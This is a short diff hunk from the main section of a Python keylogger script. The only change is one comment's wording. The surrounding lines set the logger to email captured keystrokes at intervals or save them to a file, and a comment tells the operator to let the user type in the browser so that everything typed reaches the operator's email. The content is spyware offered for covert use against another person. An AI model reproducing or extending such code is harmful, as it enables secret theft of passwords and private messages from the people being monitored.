@@ -112,7 +112,7 @@ if __name__ == "__main__":
     #TO CHANGE THE LOCATION FOR USER INPUT TO BE STORED, UNCOMMENT ONE OF THESE BELOW.
     # if you want a keylogger to send to your email
     keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
-    # if you want a keylogger to record keylogs to a local file 
+    # if you want a keylogger to record keystrokes to a local file 
     # (and then send it using your favorite method)
     # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     #TO USE THIS, ONCE THE CODE HAS RAN: DO SOME BROWSER ACTIVITY INVOLVING TYPING, and whatever the user has typed should go to your email or other other path that you have chosen.
